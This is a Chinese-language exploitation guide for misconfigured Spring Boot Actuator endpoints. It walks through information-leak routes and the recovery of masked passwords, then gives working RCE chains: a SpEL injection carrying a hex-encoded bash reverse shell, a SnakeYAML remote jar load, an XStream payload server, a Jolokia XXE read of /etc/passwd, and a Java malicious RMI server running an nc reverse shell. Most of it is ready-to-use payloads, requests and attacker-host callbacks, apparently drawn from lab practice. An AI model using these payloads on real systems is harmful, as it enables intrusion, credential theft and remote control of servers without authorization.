# **Spring Boot 集合**

## **前言**

Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE





## 版本

Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合



### 组件版本相互依赖关系

![image-20210825221013561](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210825221013561.png)



### Spring Cloud 与 Spring Boot 版本之间的依赖关系

![image-20210825221109141](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210825221109141.png)



### Spring Cloud 小版本号的后缀及含义

![image-20210825221154274](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210825221154274.png)



[TOC]



## 环境搭建

环境准备：JDK 1.8 or later and Maven 3.2+

漏洞环境集合源码

```
链接：https://pan.baidu.com/s/18PSZvDxIRFwuNQBxo__4Ng 
提取码：jfzx 
```



下面是网盘中的资源包对应的命令执行漏洞

```
springboot-spel-rce包-------------------------------------命令执行2.1  
springcloud-snakeyaml-rce包-------------------------------命令执行2.2
actuator-testbed-master包---------------------------------命令执行2.3  2.4  2.5
springboot-h2-database-rce包------------------------------命令执行2.6  2.8
springboot-restart-rce包----------------------------------命令执行2.7  2.10 2.11 2.12
springboot-mysql-jdbc-rce --------------------------------命令执行2.9
maliciousRMIServer包包含RMI服务代码
```



修改监听端口(不修改的话默认只能在搭建环境主机上访问)

```
src/main/resources/application.properties server.address=0.0.0.0
```



安装

```
mvn install
```



启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)

```
java -jar ./target/xxxxxxxx.jar
```

![](media/a149799f8e8cf1d346efe3ee5649f3d1.png)



访问http:*//127.0.0.1:8090显示springboot欢迎页面*

![](media/733cfef5eb93509eee7b349f83def144.png)



当访问错误页面时，会提示错误信息

![](media/b84c0336ffa31a1c60da33c76f379659.png)

这里访问env就可以看到环境特性

![](media/0b00e02831d25ebd363910e0a85f6c16.png)

访问health显示应用的健康状态

![](media/e506922f3ff848db66817588eb0afe41.png)



## 漏洞集合

### 1.信息泄露

#### 1.1.路由及接口调用详情泄露

> 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等



可以访问以下swagger相关路由进行验证

```
/v2/api-docs
/swagger-ui.html

/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```



**一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞**，但是以 "**默认安全**" 来讲，不暴露出这些信息更加安全。

对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞



**还有一些内置的端点路由由于未设置actuator访问控制暴露**

所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义

![](media/33a5ec86aaddffe377ab51095d2b50db.png)

>   ```
>   注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：
>   
>   Spring1.x与2.x在post请求方面也存在差异，
>   
>   1.x通过application/x-www-form-urlencoded 进行post请求，
>   
>   2.x通过传递json包请求的applistion/json
>   ```



其中对寻找漏洞比较重要接口的有：

- `/env`、`/actuator/env`

  GET 请求 `/env` 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；

  同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。

- `/refresh`、`/actuator/refresh`

  POST 请求 `/env` 接口设置属性后，可同时配合 POST 请求 `/refresh` 接口刷新属性变量来触发相关 RCE 漏洞。

- `/restart`、`/actuator/restart`

  暴露出此接口的情况较少；可以配合 POST请求 `/env` 接口设置属性后，再 POST 请求 `/restart` 接口重启应用来触发相关 RCE 漏洞。

- `/jolokia`、`/actuator/jolokia`

  可以通过 `/jolokia/list` 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。

- `/trace`、`/actuator/httptrace`

  一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。

  

> 除了上面一些端点路由，还有程序员自定义的根路径
>
> - /manage、/management、项目APP相关名称
> - 修改内置端点名字(如有些时候/env被程序员修改为/appenv)



#### 1.2.端点路由泄露导致敏感信息泄露

**认证字段的获取以证明可影响其他用户**

> 这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator
> 配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP
> 头等），还有用户 token、cookie字段

trace 路径：

![](media/d50c0dccc7f6b5f4a461764a2f7065b4.png)

用户字段泄露:

![](media/561692caae82f0847bc116f9873e09d1.png)

通过替换 token 字段可获取其他用户的信息

**数据库账户密码泄露**

由于 actuator 会监控站点 mysql、mangodb
之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb
数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator
配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码：

![](media/db9fb7d5cba6a62bd56ea1cf07835469.png)

**Gitlab源代码泄露**

这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git
项目地址：

![](media/813b4e89bbaa2442f21e889e89be4d9c.png)

**后台用户账号密码泄露**

这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof
堆转储文件。在 Android studio
打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码



#### 1.3获取星号脱敏的密码明文

##### 方法一

> 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果



###### 利用条件

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 `jolokia-core` 依赖（版本要求暂未知）



###### 利用过程

**步骤一:确定属性名**

访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性



**步骤二:jolokia 调用相关 Mbean** 

这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到

- 调用 `org.springframework.boot` Mbean

> 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```



- 调用 `org.springframework.cloud.context.environment` Mbean


> 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法

spring 1.x

```
POST /jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```

spring 2.x

```
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}
```



- 调用其他 Mbean

> 目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。



##### 方法二

###### 利用条件

- 可以 GET 请求目标网站的 `/env` 
- 可以 POST 请求目标网站的 `/env` 
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标使用了 `spring-cloud-starter-netflix-eureka-client` 依赖
- 目标可以请求攻击者的服务器（请求可出外网）



###### 利用方法

**步骤一:确定属性名**

访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性



**步骤二： 使用 nc 监听 HTTP 请求**

在自己控制的外网服务器上监听 80 端口：

```bash
nc -lvvp 80
```



**步骤三：  触发对外 http 请求**

`eureka.client.serviceUrl.defaultZone=http://value:${属性}@your-vps-ip:port`  

`属性`替换为想要获取的目标属性

`your-vps-ip` 换成自己外网服务器的真实 ip 地址

`port`为前面监听的端口



- `eureka.client.serviceUrl.defaultZone` 方法（**不适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${属性}@your-vps-ip:port
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${属性}@your-vps-ip:port"}
```



- `spring.cloud.bootstrap.location` 方法（**同时适用于**明文数据中有特殊 url 字符的情况）

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip:port/?=${属性}
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip:port/?=${属性}"}
```



**步骤四： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json

```



**步骤五： 解码属性值**

正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 `Authorization` 头内容：

```
Authorization: Basic dmFsdWU6MTIzNDU2
```

将其中的 `dmFsdWU6MTIzNDU2`部分使用 base64 解码，即可获得类似明文值 `value:123456`，其中的 `123456` 即是目标星号 * 脱敏前的属性值明文。



##### 方法三

###### 利用条件

- 可正常 GET 请求目标 `/heapdump` 或 `/actuator/heapdump` 接口

  

###### 利用方法

**步骤一:确定属性名**

访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性



**步骤二:下载 jvm heap 信息**

> 下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G

`GET` 请求目标的 `/heapdump` 或 `/actuator/heapdump` 接口，下载应用实时的 JVM 堆信息



**步骤三:使用 MAT 获得 jvm heap 中的密码明文**

参考 [文章](https://landgrey.me/blog/16/) 方法，使用 [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) 工具的 **OQL** 语句 

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))

或

select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))
```

辅助用 "**password**" 等关键词快速过滤分析，获得密码等相关敏感信息的明文。





### 2.命令执行

#### 2.1.whitelabel error page SpEL RCE

##### 利用条件

- spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0
- 至少知道一个触发 springboot 默认错误页面的接口及参数名



##### 利用方法

**步骤一: 找到目标网站正常传参点**

比如发现访问  `/xxxx?id=xxx` ，页面会报状态码为 500 的默认错误页面



**步骤二: 确认漏洞点**

输入 `/xxxx?id=${运算表达式}` (假设运算表达式为7x7)

如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。



**步骤三: 命令执行漏洞利用**

运行代码将执行的命令字符串转换成 `0x**` java 字节形式(只需将target变量修改为需要执行的命令即可)

```python
# coding: utf-8

result = ""
target = '执行的命令'
for x in target:
    result += hex(ord(x)) + ","
print(result.rstrip(','))
```



执行 `open -a Calculator` 命令

```java
http://ip:port/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
```



##### 利用实例

环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方

在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章[点击这里](https://blog.csdn.net/weixin_44373935/article/details/90046451))



访问https://127.0.0.1:9091/article?id=${7*7}

可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用

![image-20210827133545079](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827133545079.png)

下面将花括号里面的修改成需要执行的命令

首先要将命令字符串转换为java字节形式，利用上面的python脚本

这里执行的命令为bash反弹shell，先将其进行base64编码转换([在线转换地址](http://www.jackson-t.ca/runtime-exec-payloads.html))

```
bash -i > & /dev/tcp/192.168.233.243/9090  0>&1

转换后:
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4yNDMvOTA5MCAwPiYx}|{base64,-d}|{bash,-i}
```



在将其转换为java字节

![image-20210827151659784](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827151659784.png)



使用nc监听192.168.233.243的9090端口

```
nc -lvvp 9090

```



将转换后的java字节拼接到payload中，在浏览器中访问

```
http://192.168.233.243:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4f,0x54,0x49,0x75,0x4d,0x54,0x59,0x34,0x4c,0x6a,0x49,0x7a,0x4d,0x79,0x34,0x79,0x4e,0x44,0x4d,0x76,0x4f,0x54,0x41,0x35,0x4d,0x43,0x41,0x77,0x50,0x69,0x59,0x78,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d}))}
```



反弹shell成功

![image-20210827152313055](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827152313055.png)





##### 利用原理

1. spring boot 处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中
2. 此时 URL 中的参数值会用 `parseStringValue` 方法进行递归解析
3. 其中  `${}`  包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的 `resolvePlaceholder` 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞

详细分析参见下文:

​	[SpringBoot SpEL表达式注入漏洞-分析与复现](https://www.cnblogs.com/litlife/p/10183137.html)



#### 2.2Spring clound SnakeYAML RCE

##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标依赖的 `spring-cloud-starter` 版本 < 1.3.0.RELEASE
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



##### 利用方法

**步骤一**: **托管yml和jar文件**

> 首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问

在根目录下放置yml文件，内容如下:

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-ip-ip/example.jar"]
  ]]
]
```



在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)

**步骤二： 设置 spring.cloud.bootstrap.location 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```



**步骤三： 刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json

```



##### **利用实例**

这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务



在根目录下放置yml文件，内容如下:

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://192.168.233.243/example.jar"]
  ]]
]
```



在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)

(代码也在网盘里面，为springcloud-snakeyaml-rce/yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java)

只需将exec()里面修改为执行的命令即可

![image-20210827163442633](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210827163442633.png)



将其进行打包成jar包

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf example.jar -C src/ .
```



使用python快速开启http服务

```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



通过burp抓包并修改请求报文

![image-20210829225702843](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210829225702843.png)



然后修改请求报文/refresh，刷新配置文件

![image-20210829230055895](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210829230055895.png)

反弹shell成功

![image-20210829230223141](Spring Boot Actuator未授权访问利用实战利用.assets/image-20210829230223141.png)



##### 利用原理

1. spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址
2. refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3. SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作
4. 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5. 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化
6. 实例化类时执行恶意代码，造成 RCE 漏洞

分析详情参见下文

[Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记](https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/)



#### **2.3.Eureka服务漏洞**

Eureka服务漏洞需要存在两个包

>   ```
>   spring-boot-starter-actuator（/refresh刷新配置需要）  
>   spring-cloud-starter-netflix-eureka-client（功能依赖）
>   ```



##### 利用条件

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 `spring-boot-starter-actuator` 依赖）
- 目标使用的  `eureka-client` < 1.8.7（通常包含在 `spring-cloud-starter-netflix-eureka-client` 依赖中）
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



>   Eureka-Client\<1.8.7，eureka服务多用于netflix组件中，可通过在\<
>   span=""\>/env中搜寻Netflix关键字判断时候可能存在Eureka服务

![](media/7af2a3cf6a49f6b649e1aacbeb4aacf7.png)

Eureka服务属性被设置为恶意的外部Eureka server
URL地址时，通过/refresh会触发目标机器请求远程URL,Eureka server
URL可通过在/env处POST数据进行更改



##### 利用方法

**步骤一:  架设响应Xstream payload的网站**

提供一个依赖 Flask 并符合要求的 [python 脚本示例](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)，作用是利用目标 Linux 机器上自带的 python 来反弹shell。

使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。



**步骤二：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvvp 监听端口
```



**步骤三：设置 eureka.client.serviceUrl.defaultZone 属性**

spring 1.x

```
POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

spring 2.x

```
POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```



**步骤四：刷新配置**

spring 1.x

```
POST /refresh
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh
Content-Type: application/json

```



##### 利用实例

使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下：

```python
#!/usr/bin/env python# coding: utf-8
from flask import Flask, Response
app = Flask(__name__)
@app.route('/', defaults={'path':''})@app.route('/<path:path>',methods=['GET','POST'])

def catch_all(path):    
xml = """<linked-hash-set>  <jdk.nashorn.internal.objects.NativeString>    
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">      <dataHandler>        
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">          
<is class="javax.crypto.CipherInputStream">            
<cipher class="javax.crypto.NullCipher">              <serviceIterator class="javax.imageio.spi.FilterIterator">                <iter class="javax.imageio.spi.FilterIterator">                  <iter class="java.util.Collections$EmptyIterator"/>                  <next class="java.lang.ProcessBuilder">                    
<command>                       
<string>/bin/bash</string>                       
<string>-c</string>                      
<string>bash -i >&amp; /dev/tcp/192.168.233.247/1234 0>&amp;1</string>                    
</command>                    <redirectErrorStream>false</redirectErrorStream>                  </next>                
</iter>                
<filter class="javax.imageio.ImageIO$ContainsFilter">                  <method>                    
<class>java.lang.ProcessBuilder</class>                    <name>start</name>                    
<parameter-types/>                 
 </method>                  
<name>foo</name>                
</filter>                
<next class="string">foo</next>             
 </serviceIterator>              
<lock/>            
</cipher>            
<input class="java.lang.ProcessBuilder$NullInputStream"/>            <ibuffer></ibuffer>          
</is>        
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString></linked-hash-set>"""    return Response(xml, mimetype='application/xml')

if __name__ == "__main__":    app.run(host='0.0.0.0', port=80)

```

Python3启动web,如下:

![](media/7622e80d3286c478d7fdf42a216d67d4.png)



使用Burp构造请求报文发送POST请求

```
eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream
```

![](media/85864c908118a436d542c5dfc3fedba5.png)

刷新配置

```
POST /refresh
```

![](media/e061acae7d5aaf5dd9e36a188a0c7375.png)



kali开启监听端口1234获取反弹shell

![](media/c2aacb012495255a8681c062a427bc34.png)

注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161



##### 利用原理

1. eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
2. refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
3. 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞

详细分析参见下文

[Spring Boot Actuator从未授权访问到getshell](https://www.freebuf.com/column/234719.html)



#### **2.4.Jolokia漏洞 XXE**

##### 利用条件

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口

- 目标使用了 `jolokia-core` 依赖（版本要求暂未知）并且环境中存在相关 MBean

- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

- 普通 JNDI 注入受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过

  

##### 利用方法

**步骤一:查看已存在的 MBeans**

访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。



**步骤二：托管 xml 文件**

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server
# 也可以开启apache或者nginx的http服务将其放在根目录下

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `xml` 结尾的 `example.xml`  文件，内容如下：

```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://your-vps-ip:port/jndi" as="appName" />
</configuration>
```



**步骤三：准备要执行的 Java 代码**

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`，

使用Maven对其进行编译打包：

```bash
mvn clean install
```

**然后将生成的** jar包拷贝到 **步骤二** 中的网站根目录。



**步骤四：架设恶意 RMI 服务**

设置RMI服务的ip地址和开启服务端口8090

```bash
java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar
```



**步骤五：监听反弹 shell 的端口**

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvvp 监听端口
```



**步骤六：从外部 URL 地址加载日志配置文件**

> ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。

替换实际的 your-vps-ip 地址访问 URL 触发漏洞：

```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
```



##### 利用实例

判断是否存在jolokia插件访问http://ip:port/jolokia/list 是否存在

![](media/4406018ebff3c7de7dd29c07d7e0ccc7.png)



在/jolokia/list 接口搜索关键字：

```
ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL
```

![](media/9fc925bb48d7fbc26191d101b9a9adab.png)



**读取敏感文件**

创建xml文档logback.xml

请求访问fileread.dtd文件，192.168.233.1为服务器ip

>   ```
>   <?xml version="1.0" encoding="utf-8" ?\>
>   
>    \<!DOCTYPE a [ \<!ENTITY % remote SYSTEM
>   
>     "http://192.168.233.1/filereaed.dtd"\>%remote;%int;]\>
>   
>   \<a\>&trick;\</a\>
>   ```



将该xml放到服务器上，用于访问获取

![](media/2c2311a2d34ee6ff782221a35d920431.png)

创建文件fileread.dtd，读取/etc/passwd文件

>   ```
>    <!ENTITY % d SYSTEM "file:///etc/passwd">
>   
>    <!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
>   ```

![](media/f2d4373437722b5f3d7ac97085b66953.png)



在外部构造url访问，Payload如下：

```
http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml
```

可以看到返回的信息中存在etc/passwd的用户信息

如红框中所示

![](media/66e6d7ece8ce1dbfd308720f8cbbb751.png)



**远程代码执行**

可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI
加载变量，导致了rce漏洞产生。  
rce的流程主要分为4步。

```
1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。

2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI
    为恶意 RMI 服务地址。

3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference
    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class
    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。

4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用
    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference
    所指向的任意 Bean Class，并且会调用 setter
    方法为所有的属性赋值。对应我们的代码，最终调用 setter
    方法的时候，就是执行如下代码：

ELProcessor.eval(\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil-server-ip port >/tmp/f']).start()\"
```



而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE
的效果。

下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 8090");//RMI服务地址为8090
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.233.249 1234 >/tmp/f']).start()\")"));
         //反弹shell地址为192.168.233.249，端口为1234
        
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}

```



使用maven对java代码进行编译打包

```
命令:mvn clean install
```

打包成功

![](media/d4957a0c50e626f62d06f5fc2853ddbb.png)



将上面打包的jar放到kali上，开启8090端口

```
如下命令:java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar
```

![](media/d1dffff25909ba0840e280f858d32e0d.png)

使用nc开启监听1234端口

![](media/b531b990d627d9069028dcea04343c27.png)



下面为在服务器上放置的logback.xml用来请求kaLi开启的8090端口建立连接

```
<configuration>

<insertFromJNDI env-entry-name="rmi://192.168.233.249:8090/jndi" as="appName"
>

</configuration>
```



在浏览器中从外部构造url访问

```
http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!192.168.233.1!/logback.xml
```



浏览器返回结果如下:

![](media/1e7783f49e5d0511d34e21997052151e.png)

